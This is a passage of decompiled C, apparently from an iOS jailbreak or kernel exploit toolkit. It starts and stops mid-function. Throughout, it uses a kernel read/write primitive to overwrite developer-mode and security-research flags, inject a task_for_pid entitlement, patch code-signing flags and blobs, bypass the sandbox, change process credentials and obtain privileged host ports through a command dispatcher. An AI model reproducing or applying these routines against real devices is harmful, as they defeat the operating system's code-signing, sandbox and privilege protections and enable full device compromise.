      *(uint64_t *)(v85 + 296) = *(uint64_t *)&v104.st_dev;
      v71 = *(uint64_t *)&v104.st_dev;
    }
  }
  *(uint64_t *)&krwCtx->gap_0x138 = v71;
  krw_ctx_clr_flag(krwCtx, 256);
  if ( krwCtx->krw_pipe_0 == -1
    || krwCtx->krw_pipe_1 == -1
    || krwCtx->iosurfaceFd == -1
    || !krwCtx->gap_0x218
    || (mach_port_with_a2 = setup_iosurface_semaphore_helper(krwCtx), !(uint32_t)mach_port_with_a2) )
  {
    if ( krwCtx->threadForKernelRead + 1 < 2
      || !*(uint64_t *)&krwCtx->threadStateKrwPhysAddr
      || (mach_port_with_a2 = find_map_iosurface_memory(krwCtx), !(uint32_t)mach_port_with_a2) )
    {
      if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8791, 1023, 1023, 1023, 1023) )
        goto LABEL_280;
      LOBYTE(cpuFamily) = 0;
      if ( (unsigned int)check_krw_necp_state(krwCtx, (bool *)&cpuFamily) )
      {
        if ( (uint8_t)cpuFamily )
          goto LABEL_280;
        if ( (unsigned int)check_dispatch_krw_state(krwCtx, 1) )
        {
          v86 = krwCtx->amfiMachoCtx;
          if ( !v86 )
            return 708609;
          variable_addr = kernel_find_symbol_by_cstring_scan(v86, "__DATA", "__data", "developer_mode_status");
          if ( !variable_addr )
            return 163867;
          v88 = variable_addr;
          mach_port_with_a2 = 163855;
          if ( !kread_physmap_decorated(krwCtx, variable_addr - 2LL * krwCtx->stride_0x168, (unsigned __int64 *)&v104) )
            return mach_port_with_a2;
          if ( *(uint64_t *)&v104.st_dev )
            goto LABEL_280;
          v89 = kernel_find_symbol_by_cstring_scan(krwCtx->amfiMachoCtx, "__DATA", "__data", "allows_security_research");
          if ( !v89 )
            return 163867;
          v90 = v89;
          if ( !kread_physmap_decorated(krwCtx, v88, &v103) )
            return mach_port_with_a2;
          if ( !v103 )
            return 163878;
          mach_port_with_a2 = 163856;
          if ( !kwrite64(krwCtx, v90, v103) || !kwrite64(krwCtx, v88, v103 + 10) )
            return mach_port_with_a2;
LABEL_280:
          if ( v97 || v94 > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
          {
            mach_port_with_a2 = refresh_target_task_port(krwCtx, mach_task_self_, 0, 0);
            if ( (uint32_t)mach_port_with_a2 )
              return mach_port_with_a2;
          }
          if ( v95 )
          {
            mach_port_with_a2 = physmap_kread(krwCtx, mach_task_self_);
            if ( (uint32_t)mach_port_with_a2 )
              return mach_port_with_a2;
            mach_port_with_a2 = setup_krw_engine(krwCtx);
            if ( (uint32_t)mach_port_with_a2 )
              return mach_port_with_a2;
          }
          krwCtx->hostSelfPort = mach_host_self();
          v72 = get_kernel_task_host_port(krwCtx);
          LODWORD(krwCtx->hostPrivAndSecurityPorts) = v72;
          mach_port_with_a2 = 163854;
          if ( krwCtx->hostSelfPort + 1 < 2 )
            return mach_port_with_a2;
          v73 = v72;
          if ( v72 + 1 < 2 )
            return mach_port_with_a2;
          if ( (krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 )
          {
            if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
            {
              v74 = get_ioservice_conn_port(krwCtx);
              HIDWORD(krwCtx->hostPrivAndSecurityPorts) = v74;
              if ( (unsigned int)(v74 + 1) < 2 )
                return mach_port_with_a2;
              goto LABEL_291;
            }
LABEL_293:
            if ( !set_task_special_port_and_patch_uid(krwCtx, mach_task_self_, v73) )
              return 163848;
            krw_ctx_set_flag(krwCtx, KRW_CTX_FLAG_HOST_PORT_READY);
          }
          else
          {
LABEL_291:
            if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023) )
            {
              v73 = krwCtx->hostPrivAndSecurityPorts;
              goto LABEL_293;
            }
          }
          v76 = krwCtx->hostPrivAndSecurityPorts;
          if ( v76 + 1 < 2 )
            return 708609;
          v104.st_dev = 0;
          if (1) return 0;// FIXME: host_get_special_port doesn't work on Dopamine
          if ( host_get_special_port(v76, -1, 16, (mach_port_t *)&v104) )
            return 708619;
          if ( (unsigned int)(v104.st_dev + 1) >= 2 )
          {
            mach_port_deallocate(mach_task_self_, v104.st_dev);
            return 708644;
          }
          mach_port_with_a2 = pgtable_write_aligned(krwCtx);
          if ( (uint32_t)mach_port_with_a2 )
            return mach_port_with_a2;
          if ( v96 || !something )
            return 0;
          setupPath = krw_select_setup_path(krwCtx);
          v92 = krw_finish_selected_setup_path(krwCtx, setupPath);
          if ( !v92 )
            return 163868;
          return 0;
        }
        return 163843;
      }
      return v8;
    }
  }
  return mach_port_with_a2;
}
// 3CDA8: variable 'v7' is possibly undefined
// 3DDB8: variable 'v75' is possibly undefined
// 19B94: using guessed type __int64 __fastcall macho_read_u64_thunk(uint64_t, uint64_t);
// 43730: using guessed type __int128 xmmword_43730;

//----- (000000000003E1D8) ----------------------------------------------------
bool __fastcall validate_ipc_kobject_read(struct_krwCtx *krwCtx, mach_port_t a2)
{
  unsigned __int64 v3; // x21
  unsigned __int64 v4; // x0
  __int64 v5; // x8
  int v6; // w10
  int v7; // w11
  __int64 v8; // x9
  unsigned int v9; // w20
  __int64 v10; // x20
  __int64 v11; // x1
  __int64 v12; // x0
  __int64 v13; // x3
  __int64 v14; // x8
  __int64 v16; // [xsp+8h] [xbp-48h] BYREF
  __int64 v17; // [xsp+10h] [xbp-40h] BYREF
  __int64 v18; // [xsp+18h] [xbp-38h] BYREF
  int v19; // [xsp+24h] [xbp-2Ch] BYREF
  __int64 v20; // [xsp+28h] [xbp-28h] BYREF

  v3 = krwCtx->xnuVersionPacked;
  v4 = get_task_kobject_addr(krwCtx, a2);
  if ( !v4 )
    return 0;
  v5 = 0;
  v6 = v3 <= XNU_VERSION_PACKED(6153, 40, 149, 1023, 1023) ? 56 : 48;
  v7 = krwCtx->xnuMajorVersion;
  if ( v7 > 8791 )
  {
    v9 = 352;
    v8 = 776;
    if ( v7 != 8792 && v7 != 8796 && v7 != 10002 )
      return v5;
  }
  else if ( (unsigned int)(v7 - 8019) < 2 )
  {
    v8 = 784;
    if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
      v8 = 824;
    v9 = 352;
  }
  else if ( v7 == 6153 )
  {
    v9 = 10 * v6;
    v8 = 808;
  }
  else
  {
    if ( v7 != 7195 )
      return v5;
    v8 = 832;
    if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023) )
      v8 = 824;
    v9 = 10 * v6;
  }
  if ( !kread_physmap_decorated(krwCtx, v8 + v4, (unsigned __int64 *)&v20) )
    return 0;
  if ( !validate_kaddr_range(krwCtx, v20) )
    return 0;
  v10 = v20 + v9 + 24;
  if ( !(unsigned int)krw_read_thunk(krwCtx, v10, 4, &v19) )
    return 0;
  if ( (v19 & 1) == 0 )
    return 0;
  v18 = 0x7FFFFFFFFFFFFFFFLL;
  if ( !(unsigned int)kwrite_with_retry(krwCtx, v10 + 8, (__int64)&v18, 8) )
    return 0;
  if ( v3 < XNU_VERSION_PACKED(6153, 40, 150, 0, 0) )
  {
    v17 = 0x7FFFFFFFFFFFFFFFLL;
    v11 = v10 + 16;
    v12 = krwCtx;
    v13 = 8;
  }
  else
  {
    LOWORD(v17) = -1;
    v11 = v10 + 4;
    v12 = krwCtx;
    v13 = 2;
  }
  if ( !(unsigned int)kwrite_with_retry(v12, v11, (__int64)&v17, v13) )
    return 0;
  v19 &= 0xFFFFCB0F;
  if ( !(unsigned int)kwrite_with_retry(krwCtx, v10, (__int64)&v19, 4) )
    return 0;
  v16 = 0;
  v14 = 48;
  if ( v3 > XNU_VERSION_PACKED(6153, 40, 149, 1023, 1023) )
    v14 = 40;
  return (unsigned int)kwrite_with_retry(krwCtx, v10 + v14, (__int64)&v16, 8) != 0;
}

//----- (000000000003E42C) ----------------------------------------------------
__int64 __fastcall driver_init2(struct_krwCtx **krwCtxOut, char something)
{
  struct_krwCtx *krwCtx = (struct_krwCtx *)calloc(KRW_CTX_SIZE, 1u);
  if ( !krwCtx )
    return 0xAD009;

  uint64_t initResult = driver_init2_1(krwCtx, (something & 1) == 0);
  if ( !(uint32_t)initResult )
  {
    if ( (unsigned int)get_root_statfs(krwCtx, &krwCtx->isRW) )
    {
      *krwCtxOut = krwCtx;
      free_decompressed_macho(krwCtx);
      return 0;
    }
    free_decompressed_macho(krwCtx);
    initResult = 163873;
  }

  free(krwCtx);
  return initResult;
}

//----- (000000000003E4D0) ----------------------------------------------------
__int64 __fastcall free_decompressed_macho(uint64_t *a1)
{
  __int64 v2; // x0
  __int64 v3; // x0
  __int64 v4; // x0
  __int64 v5; // x0
  __int64 v6; // x0
  __int64 result; // x0

  v2 = a1[831];
  if ( v2 )
    unmap_macho_image(v2);
  v3 = a1[931];
  if ( v3 )
    unmap_macho_image(v3);
  v4 = a1[932];
  if ( v4 )
    unmap_macho_image(v4);
  v5 = a1[933];
  if ( v5 )
    unmap_macho_image(v5);
  v6 = a1[934];
  if ( v6 )
    unmap_macho_image(v6);
  result = a1[935];
  if ( result )
  {
    return unmap_macho_image(result);
  }
  return result;
}
// 3E534: variable 'vars8' is possibly undefined

//----- (000000000003E550) ----------------------------------------------------
__int64 __fastcall driver_dispatch_command2(
        struct_krwCtx *krwCtx,
        int cmd,
        __int64 cmdMirror,
        __int64 arg0,
        __int64 arg1,
        __int64 arg2,
        __int64 arg3,
        __int64 arg4,
        __int64 inoutValue)
{
  return driver_dispatch_command3(krwCtx, cmd, inoutValue);
}

//----- (000000000003E580) ----------------------------------------------------
__int64 __fastcall driver_dispatch_command3(struct_krwCtx *krwCtx, int cmd, __int64 inoutValue)
{
  __int64 v3; // x20
  __int64 v6; // x21
  __int64 result; // x0
  unsigned __int32 v8[2]; // x0
  __int64 v9; // x20
  int xnuMajorVersion; // w8
  __int64 v11; // x22
  __int64 v12; // x8
  task_name_t v17; // w1
  struct_krwCtx *v18; // x0
  int v19; // w2
  __int64 *v20; // x3
  task_inspect_t v29; // w1
  mach_port_t v30; // w1
  mach_port_t v31; // w20
  unsigned int v32; // w1
  task_inspect_t v33; // w1
  __int64 v34; // x4
  mach_port_t v35; // w1
  mach_port_t v36; // w1
  mach_port_t v37; // w1
  struct_krwCtx *v38; // x0
  int v39; // w2
  mach_port_t v40; // w1
  int v41; // w0
  task_name_t v42; // w1
  int v43; // t1
  int v44; // w1
  vm_prot_t v45; // w4
  unsigned int v46; // w1
  mach_vm_address_t v47; // x21
  unsigned __int64 v48; // x20
  int v49; // w22
  __int64 v50; // [xsp+0h] [xbp-40h] BYREF
  int v52; // [xsp+Ch] [xbp-34h] BYREF

  v3 = inoutValue;
  v6 = 708616;
  if ( !((unsigned int)cmd >> 30) || (result = 708609, inoutValue) )
  {
    *(__int128 *)&krwCtx->gap_0x18B8 = 0u;
    krw_ctx_clr_flag(krwCtx, 0x800000);
    update_timer_lru_cache(krwCtx);
    result = refresh_target_task_port(krwCtx, mach_task_self_, 0, 0);
    if ( !(uint32_t)result )
    {
      if ( BYTE1(cmd) == 3 )
      {
        v6 = driver_dispatch_stage3_command(krwCtx, cmd, v3);
        goto LABEL_219;
      }
      if ( BYTE1(cmd) != 1 )
      {
        if ( !BYTE1(cmd) )
        {
          v8[0] = 0;
          if ( cmd <= 0x40000003 )
          {
            switch ( cmd )
            {
              case DRIVER_CMD_PATCH_PARENT_CSFLAGS:
                LODWORD(v50) = 0;
                v52 = 0;
                *(uint64_t *)v8 = kread_task_struct(krwCtx, mach_task_self_);
                if ( !*(uint64_t *)v8 )
                  goto LABEL_215;
                v9 = *(uint64_t *)v8;
                v8[0] = 0;
                xnuMajorVersion = krwCtx->xnuMajorVersion;
                if ( xnuMajorVersion <= 8019 )
                {
                  switch ( xnuMajorVersion )
                  {
                    case 6153:
                      v11 = 352;
                      v12 = 328;
                      break;
                    case 7195:
                      v11 = 328;
                      v12 = 304;
                      break;
                    case 8019:
                      v11 = 476;
                      v12 = 448;
                      break;
                    default:
                      goto LABEL_215;
                  }
                }
                else if ( xnuMajorVersion > 8795 )
                {
                  if ( xnuMajorVersion != 8796 && xnuMajorVersion != 10002 )
                    goto LABEL_215;
                  v11 = 1140;
                  v12 = 1112;
                }
                else if ( xnuMajorVersion == 8020 )
                {
                  v11 = 644;
                  v12 = 616;
                }
                else
                {
                  if ( xnuMajorVersion != 8792 )
                    goto LABEL_215;
                  v11 = 636;
                  v12 = 608;
                }
                v47 = v12 + v9;
                v8[0] = kread_u32(krwCtx, v12 + v9, &v52);
                if ( v8[0] )
                {
                  v48 = v11 + v9;
                  v8[0] = kread_u32(krwCtx, v48, &v50);
                  if ( v8[0] )
                  {
                    if ( krwCtx->xnuMajorVersion < 8792 || (v52 & 2) != 0 )
                    {
                      if ( (v52 & 0x400) == 0
                        || (v49 = v50, v49 != getppid())
                        || ((v52 &= ~0x400u, (v8[0] = noppl_kwrite32(krwCtx, v47, v52)) != 0)
                        && (v8[0] = noppl_kwrite32(krwCtx, v48, 0)) != 0) )
                      {
                        v8[0] = 1;
                      }
                    }
                    else
                    {
                      v8[0] = 0;
                    }
                  }
                }
                break;
              case DRIVER_CMD_GET_SELF_TASK_PORT_OFFSET:
                v30 = mach_task_self_;
                goto LABEL_124;
              case DRIVER_CMD_INJECT_TFP_ENTITLEMENT:
                v8[0] = krw_inject_entitlements_maybe(
                          krwCtx,
                          mach_task_self_,
                          "<dict><key>task_for_pid-allow</key><true/></dict>");
                goto LABEL_215;
              case 4:
              case 5:
              case 14:
              case 16:
              case 17:
              case 18:
              case 24:
              case 25:
              case 27:
              case 28:
              case 29:
              case 30:
              case 32:
              case 33:
              case 35:
              case 36:
              case 37:
                goto LABEL_216;
              case DRIVER_CMD_PATCH_CSBLOB:
                setup_pgtable_and_patch_csblob(krwCtx, mach_task_self_);
                goto LABEL_215;
              case DRIVER_CMD_SET_THREAD_KOBJ_DISPATCH:
                v31 = mach_thread_self();
                v32 = HIDWORD(krwCtx->targetAndParentTaskPorts);
                if ( !v32 )
                  v32 = krwCtx->targetAndParentTaskPorts;
                if ( !kwrite_task_dispatch_via_kobj(krwCtx, v32, v31) )
                  goto LABEL_215;
                LODWORD(v6) = 0;
                if ( krwCtx->exploitThread + 1 <= 1 )
                  krwCtx->exploitThread = v31;
                goto LABEL_146;
              case DRIVER_CMD_GET_OR_SET_SELF_UID_CRED:
                v8[0] = get_or_set_uid_cred_in_task(krwCtx, 0, 0, 0);
                goto LABEL_215;
              case DRIVER_CMD_SET_SELF_SPECIAL_PORT:
                v33 = mach_task_self_;
                goto LABEL_136;
              case DRIVER_CMD_SETUP_SANDBOX_BYPASS:
                setup_sandbox_bypass(krwCtx, 1);
                goto LABEL_215;
              case DRIVER_CMD_CHECK_SELF_DYLD_INFO:
                v50 = 0x100000000LL;
                v17 = mach_task_self_;
                v20 = &v50;
                v18 = krwCtx;
                v19 = 2;
                goto LABEL_105;
              case DRIVER_CMD_KREAD_SET_VM_ATTR:
                if ( (uint32_t)v3 )
                  v35 = v3;
                else
                  v35 = mach_task_self_;
                v8[0] = kread_and_set_vm_attr(krwCtx, v35);
                goto LABEL_215;
              case DRIVER_CMD_NECP_SEND_SELF:
                v36 = mach_task_self_;
                goto LABEL_128;
              case DRIVER_CMD_PGTABLE_KREAD_VM_ATTR:
                if ( (uint32_t)v3 )
                  v37 = v3;
                else
                  v37 = mach_task_self_;
                v38 = krwCtx;
                v39 = 1;
                goto LABEL_119;
              case DRIVER_CMD_PGTABLE_KREAD_VM_ATTR_NO_PATCH:
                if ( (uint32_t)v3 )
                  v37 = v3;
                else
                  v37 = mach_task_self_;
                v38 = krwCtx;
                v39 = 0;
LABEL_119:
                v8[0] = pgtable_kread_vm_attr_loop(v38, v37, v39);
                goto LABEL_215;
              case DRIVER_CMD_INJECT_CSBLOB_ENTITLEMENT:
                v8[0] = csblob_inject_entitlement(krwCtx, mach_task_self_, (const char *)v3);
                goto LABEL_215;
              case DRIVER_CMD_GET_TASK_PORT_PID_OFFSET:
                if ( (uint32_t)v3 )
                  v30 = v3;
                else
                  v30 = mach_task_self_;
LABEL_124:
                v8[0] = get_task_port_pid_field_offset(krwCtx, v30);
                goto LABEL_215;
              case DRIVER_CMD_NECP_SEND_TASK:
                if ( (uint32_t)v3 )
                  v36 = v3;
                else
                  v36 = mach_task_self_;
LABEL_128:
                v8[0] = necp_send_msg_3(krwCtx, v36, 0);
                goto LABEL_215;
              case DRIVER_CMD_VALIDATE_IPC_KOBJECT_READ:
                if ( (uint32_t)v3 )
                  v40 = v3;
                else
                  v40 = mach_task_self_;
                v8[0] = validate_ipc_kobject_read(krwCtx, v40);
                goto LABEL_215;
              case DRIVER_CMD_SET_TASK_SPECIAL_PORT:
                if ( (uint32_t)v3 )
                  v33 = v3;
                else
                  v33 = mach_task_self_;
LABEL_136:
                v8[0] = set_task_special_port_and_patch_uid(krwCtx, v33, krwCtx->hostPrivAndSecurityPorts);
                goto LABEL_215;
              case DRIVER_CMD_PHYSMAP_KREAD_AND_REFRESH:
                if ( !(uint32_t)v3 )
                  LODWORD(v3) = mach_task_self_;
                v41 = physmap_kread(krwCtx, v3);
                if ( !v41 )
                  v41 = refresh_target_task_port(krwCtx, v3, 0, 0);
                goto LABEL_145;
              case DRIVER_CMD_INSERT_TASK_SEND_RIGHT:
                if ( (uint32_t)v3 )
                  v42 = v3;
                else
                  v42 = mach_task_self_;
                v41 = insert_task_port_send_right_versioned(krwCtx, v42);
LABEL_145:
                LODWORD(v6) = v41;
LABEL_146:
                v8[0] = 1;
                goto LABEL_216;
              case DRIVER_CMD_KREAD_PROC_ENTITLEMENT_DATA:
                v8[0] = kread_proc_kobj_entitlement_data(krwCtx, mach_task_self_);
                goto LABEL_215;
              default:
                switch ( cmd )
                {
                  case DRIVER_CMD_GET_PROC_EXEC_FLAGS:
                    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
                      goto LABEL_48;
                    v8[0] = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11);
                    if ( !v8[0] )
                      goto LABEL_216;
                    if ( krwCtx->xnuMajorVersion < 6153 )
                      goto LABEL_188;
LABEL_48:
                    v8[0] = get_proc_kobj_exec_flags(krwCtx, *(uint32_t *)v3, (bool *)(v3 + 4), (bool *)(v3 + 6), (bool *)(v3 + 5));
                    break;
                  case DRIVER_CMD_UNSUPPORTED_1C:
                  case DRIVER_CMD_UNSUPPORTED_1E:
                  case DRIVER_CMD_UNSUPPORTED_1F:
                  case DRIVER_CMD_UNSUPPORTED_21:
                  case DRIVER_CMD_UNSUPPORTED_22:
                    goto LABEL_216;
                  case DRIVER_CMD_TASK_FOR_PID_OR_NAME_RET_PTR:
                    v8[0] = krw_task_for_pid_or_name_ret_ptr(krwCtx, *(uint32_t *)v3, 0, (mach_port_name_t *)(v3 + 4));
                    goto LABEL_215;
                  case DRIVER_CMD_UPDATE_PHYSMAP_TABLE_TASK:
                    v43 = *(uint32_t *)v3;
                    v3 += 4;
                    v29 = v43;
                    goto LABEL_150;
                  case DRIVER_CMD_KREAD_VERSION_CHECK:
                    v8[0] = krw_read_with_version_check(krwCtx, *(uint32_t *)v3, *(uint64_t *)(v3 + 8), (bool *)(v3 + 24));
                    goto LABEL_215;
                  default:
                    if ( cmd != DRIVER_CMD_UPDATE_PHYSMAP_TABLE_SELF )
                      goto LABEL_216;
                    v29 = mach_task_self_;
LABEL_150:
                    v8[0] = update_physmap_table_entry_count(krwCtx, v29, (host_t *)v3);
                    goto LABEL_215;
                }
                goto LABEL_215;
            }
            goto LABEL_215;
          }
          switch ( cmd )
          {
            case DRIVER_CMD_CHECK_TASK_DYLD_INFO_8:
              v17 = *(uint32_t *)v3;
              v18 = krwCtx;
              v19 = 1;
              v20 = (__int64 *)(v3 + 4);
LABEL_105:
              v34 = 8;
              goto LABEL_153;
            case DRIVER_CMD_CHECK_TASK_DYLD_INFO_32:
              v17 = *(uint32_t *)v3;
              v18 = krwCtx;
              v19 = 3;
              v20 = (__int64 *)(v3 + 4);
              v34 = 32;
LABEL_153:
              v8[0] = check_task_dyld_info_versioned(v18, v17, v19, v20, v34);
              goto LABEL_215;
            case DRIVER_CMD_KREAD_PROC_ENTITLEMENT_FULL:
              if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
              {
                if ( check_necp_flag(krwCtx) )
                {
LABEL_189:
                  v46 = *(uint32_t *)v3;
                  if ( !*(uint32_t *)v3 )
                  {
                    v46 = mach_task_self_;
                    *(uint32_t *)v3 = mach_task_self_;
                  }
                  v8[0] = kread_proc_kobj_entitlement_full(
                    krwCtx,
                    v46,
                    *(unsigned __int8 *)(v3 + 4),
                    *(unsigned __int8 *)(v3 + 6),
                    *(unsigned __int8 *)(v3 + 5));
LABEL_215:
                  LODWORD(v6) = 0;
LABEL_216:
                  v6 = driver_dispatch_finish(v6, v8[0]);
                  break;
                }
              }
              else
              {
                v8[0] = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11);
                if ( !v8[0] )
                  goto LABEL_216;
                if ( krwCtx->xnuMajorVersion >= 6153 )
                  goto LABEL_189;
              }
LABEL_188:
              v8[0] = 0;
              goto LABEL_216;
            case DRIVER_CMD_SET_THREAD_STATE_VERSIONED:
              v44 = *(uint32_t *)v3;
              if ( !*(uint32_t *)v3 )
              {
                v44 = mach_task_self_;
                *(uint32_t *)v3 = mach_task_self_;
              }
              v8[0] = set_thread_state_versioned(
                        krwCtx,
                        v44,
                        *(uint32_t *)(v3 + 4),
                        *(uint32_t *)(v3 + 8),
                        *(natural_t **)(v3 + 16),
                        *(uint32_t *)(v3 + 24));
              goto LABEL_215;
            case DRIVER_CMD_MACH_VM_WIRE:
              if ( *(uint8_t *)(v3 + 28) )
              {
                v45 = *(uint32_t *)(v3 + 24);
              }
              else
              {
                v45 = 0;
                *(uint32_t *)(v3 + 24) = 0;
              }
              LODWORD(v6) = 0;
              v8[0] = mach_vm_wire(krwCtx->hostPrivAndSecurityPorts, *(uint32_t *)v3, *(uint64_t *)(v3 + 8), *(uint64_t *)(v3 + 16), v45) == 0;
              goto LABEL_216;
            case DRIVER_CMD_KWRITE_VERSION_CHECK:
              v8[0] = kwrite_with_version_check(krwCtx, *(uint32_t *)v3, *(uint64_t *)(v3 + 8), *(unsigned __int8 *)(v3 + 24));
              goto LABEL_215;
            default:
              goto LABEL_216;
          }
        }
LABEL_219:
        free_decompressed_macho(krwCtx);
        return v6;
      }
      v6 = driver_dispatch_stage1_command(krwCtx, cmd, v3);
      goto LABEL_219;
    }
  }
  return result;
}
// 3E8F0: control flows out of bounds to 0
// 3E7E0: conditional instruction was optimized away because w22.4>=40000004
// 3EC84: variable 'v8' is possibly undefined

//----- (000000000003F2E0) ----------------------------------------------------
__int64 __fastcall reinit_and_refresh_krw_ctx(struct_krwCtx *krwCtx)
{
  __int64 v2; // x20
  unsigned int v4; // w1
  int v6; // w22
  mach_port_t v7; // w1
  int v8; // w2
  int v10; // [xsp+Ch] [xbp-24h] BYREF

  *(__int128 *)&krwCtx->gap_0x18B8 = 0u;
  krw_ctx_clr_flag(krwCtx, KRW_CTX_FLAG_SELF_TASK_PORT_CLEARED);
  update_timer_lru_cache(krwCtx);
  v2 = refresh_target_task_port(krwCtx, mach_task_self_, 0, 0);
  if ( (uint32_t)v2 )
    return v2;
  v2 = 163871;
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_SNAPSHOT_MOUNTED) )
  {
    v10 = 0;
    if ( !(unsigned int)get_root_statfs(krwCtx, &v10) )
      return 163872;
    if ( v10 != 3 )
    {
      v4 = krwCtx->gap_0x258_size4;
      if ( v4 >= 2 )
      {
        if ( v4 != 3 )
          return 163872;
        v4 = 0;
      }
      if ( v10 == v4 || (unsigned int)check_mount_thread_info(krwCtx, v4) )
        goto LABEL_11;
      return 163872;
    }
  }
LABEL_11:
  if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_MOBILEBACKUP_SANDBOX_PATCHED) || (unsigned int)setup_sandbox_bypass(krwCtx, 0) )
  {
    if ( !krwCtx->selfTaskDyldInfoKaddr
      || (unsigned int)check_task_dyld_info_versioned(krwCtx, mach_task_self_, 2, &krwCtx->selfTaskDyldInfoValue, 8) )
    {
      if ( (v6 = krwCtx->exploitThread, (unsigned int)(v6 + 1) < 2)
        || v6 != mach_thread_self()
        || ((v7 = mach_thread_self(), krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023)) ? (v8 = 1) : (v8 = 0x4000000),
            (unsigned int)task_kobject_update_flag_bits(krwCtx, v7, v8, 0)) )
      {
        if ( !krwCtx->savedUidGid || (unsigned int)get_or_set_uid_cred_in_task(krwCtx, krwCtx->savedUid, krwCtx->savedGid, 0) )
        {
          if ( mach_host_self() == krwCtx->hostSelfPort
            || krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_HOST_PORT_READY)
            || (unsigned int)set_task_special_port_and_patch_uid(krwCtx, mach_task_self_, krwCtx->hostSelfPort) )
          {
            free_decompressed_macho(krwCtx);
            return 0;
          }
        }
      }
    }
  }
  return v2;
}
// 3F3D4: variable 'v5' is possibly undefined
// 3F4A0: variable 'v9' is possibly undefined

//----- (000000000003F4BC) ----------------------------------------------------
__int64 __fastcall driver_close_internal(struct_krwCtx *krwCtx)
{
  void (__fastcall *v2)(char *); // x8
  mach_port_name_t v3; // w1
  int v4; // w0
  int v5; // w0
  int v6; // w0
  int v7; // w0
  int v8; // w0
  mach_port_name_t v9; // w1
  io_object_t v10; // w0
  vm_address_t v11; // x1
  vm_size_t v12; // x2
  semaphore_t v13; // w1
  uint32_t *v14; // x21
  mach_port_name_t v15; // w1
  uint32_t *v16; // x23
  __int64 v17; // x0
  __int64 v18; // x0
  __int64 v19; // x0
  __int64 v20; // x0
  __int64 v21; // x0
  __int64 v22; // x0
  __int64 v23; // x0
  void *v24; // x0
  mach_port_name_t v25; // w1
  int v27; // [xsp+Ch] [xbp-34h] BYREF

  necp_dispatch_by_version((struct_krwCtx *)krwCtx);
  iterate_active_threads((__int64)krwCtx);
  v2 = (void (__fastcall *)(char *))krwCtx->cleanup_hook;
  if ( v2 )
    v2(krwCtx);
  v3 = krwCtx->targetVmPort;
  if ( v3 + 1 >= 2 )
    mach_port_deallocate(mach_task_self_, v3);
  if ( krwCtx->pipeFd0 != -1
    || krwCtx->pipeFd1 != -1
    || krwCtx->krw_pipe_0 != -1
    || krwCtx->krw_pipe_1 != -1
    || krwCtx->iosurfaceFd_size4 != -1 )
  {
    v27 = -1;
    if ( !(unsigned int)fd_open_dev_null(&v27) )
    {
      v4 = krwCtx->pipeFd0;
      if ( v4 != -1 )
      {
        close(v4);
        krwCtx->pipeFd0 = -1;
      }
      v5 = krwCtx->pipeFd1;
      if ( v5 != -1 )
      {
        close(v5);
        krwCtx->pipeFd1 = -1;
      }
      v6 = krwCtx->iosurfaceFd_size4;
      if ( v6 != -1 )
      {
        close(v6);
        krwCtx->iosurfaceFd_size4 = -1;
      }
      v7 = krwCtx->krw_pipe_0;
      if ( v7 != -1 )
      {
        close(v7);
        krwCtx->krw_pipe_0 = -1;
      }
      v8 = krwCtx->krw_pipe_1;
      if ( v8 != -1 )
      {
        close(v8);
        krwCtx->krw_pipe_1 = -1;
      }
      fd_close(v27);
    }
  }
  if ( krwCtx->semaphoreHelperCtx )
    teardown_semaphore_helper_ctx(krwCtx, 1);
  if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(10002, 60, 75, 0, 3) && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
    iogpu_teardown_ctx(krwCtx);
  if ( krwCtx->IOKitConnInfo )
  {
    v27 = -1;
    if ( !(unsigned int)fd_open_dev_null(&v27) )
    {
      teardown_sptm_pgtable_state(krwCtx);
      fd_close(v27);
    }
  }
  if ( (unsigned int)(krwCtx->gap_0x5C_size4 + 1) >= 2 )
  {
    v27 = -1;
    if ( !(unsigned int)fd_open_dev_null(&v27) )
    {
      cleanup_ioconnect_resources((__int64)krwCtx);
      fd_close(v27);
    }
  }
  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 )
  {
    v27 = -1;
    if ( !(unsigned int)fd_open_dev_null(&v27) )
    {
      join_destroy_krw_thread((__int64)krwCtx);
      fd_close(v27);
    }
  }
  teardown_krw_thread((struct_krwCtx *)krwCtx);
  mach_port_deallocate(mach_task_self_, krwCtx->hostPrivPort);
  v9 = krwCtx->hostSecurityPort;
  if ( v9 + 1 >= 2 )
    mach_port_deallocate(mach_task_self_, v9);
  v10 = krwCtx->iosurfaceObj;
  if ( v10 + 1 >= 2 )
    IOObjectRelease(v10);
  if ( (unsigned int)(krwCtx->gap_0x18D8_size4 + 1) >= 2 )
    krwCtx->gap_0x18D8_size4 = 0;
  v11 = krwCtx->mappedKernelRegion;
  if ( v11 )
  {
    v12 = krwCtx->mappedKernelSize;
    if ( v12 )
      vm_deallocate(mach_task_self_, v11, v12);
  }
  v13 = krwCtx->semaphore;
  if ( v13 + 1 >= 2 )
  {
    semaphore_destroy(mach_task_self_, v13);
    krwCtx->semaphore = 0;
  }
  if ( !pthread_mutex_lock(&krwCtx->someMutex2) )
  {
    v14 = (uint32_t *)krwCtx->restoreRecordListHead;
    krwCtx->restoreRecordListHead = 0;
    if ( v14 )
    {
      do
      {
        v15 = v14[7];
        if ( v15 + 1 >= 2 )
          mach_port_mod_refs(mach_task_self_, v15, 1u, -1);
